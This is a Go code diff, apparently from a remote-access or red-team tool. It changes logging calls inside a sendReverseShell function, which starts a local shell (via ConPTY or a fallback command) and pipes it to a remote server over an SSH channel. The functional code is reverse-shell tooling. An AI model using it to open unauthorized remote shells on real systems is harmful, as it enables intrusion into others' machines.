@@ -16,7 +16,7 @@ import (
 func (s *Session) sendReverseShell(request *ssh.Request) {
 	channel, _, openErr := s.sshConn.OpenChannel("session", nil)
 	if openErr != nil {
-		s.Errorf("failed to open a \"session\" channel to server")
+		s.Logger.Errorf("failed to open a \"session\" channel to server")
 		return
 	}
 	defer func() { _ = channel.Close() }()
@@ -27,18 +27,18 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 		// Request Server Terminal Size
 		_, payload, reqErr := s.sendConnRequest("window-size", true, nil)
 		if reqErr != nil {
-			s.Errorf("%v", reqErr)
+			s.Logger.Errorf("%v", reqErr)
 		}
 		var termSize interpreter.TermSize
 		if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
 			// If error term initializes with size 0 0
-			s.Errorf("--%v", unMarshalErr)
+			s.Logger.Errorf("--%v", unMarshalErr)
 		}
 
 		// Notify server we will be sending a PTY
 		_, errSSHReq := channel.SendRequest("pty-req", true, nil)
 		if errSSHReq != nil {
-			s.Errorf("pty-req %v", errSSHReq)
+			s.Logger.Errorf("pty-req %v", errSSHReq)
 		}
 
 		conPty, _ := conpty.Start(s.interpreter.Shell, conpty.ConPtyDimensions(termSize.Cols, termSize.Rows))
@@ -48,7 +48,7 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 		// Notify server we will send a Reverse Shell
 		_, errSSHReq = channel.SendRequest("reverse-shell", true, nil)
 		if errSSHReq != nil {
-			s.Errorf("pty-req %v", errSSHReq)
+			s.Logger.Errorf("pty-req %v", errSSHReq)
 		}
 
 		go func() { _, _ = io.Copy(s.interpreter.Pty, channel) }()
@@ -58,7 +58,7 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 		_ = s.replyConnRequest(request, true, []byte("shell-ready"))
 
 		if code, err := s.interpreter.Pty.Wait(context.Background()); err != nil {
-			s.Errorf("failed to spawn conpty with exit code %d", code)
+			s.Logger.Errorf("failed to spawn conpty with exit code %d", code)
 		}
 	} else {
 		// - You are here cause the System is likely Windows < 2018 and does not support ConPTY
@@ -77,7 +77,7 @@ func (s *Session) sendReverseShell(request *ssh.Request) {
 		_ = s.replyConnRequest(request, true, []byte("shell-ready"))
 
 		if runErr := cmd.Run(); runErr != nil {
-			s.Errorf("%v", runErr)
+			s.Logger.Errorf("%v", runErr)
 		}
 	}
 }
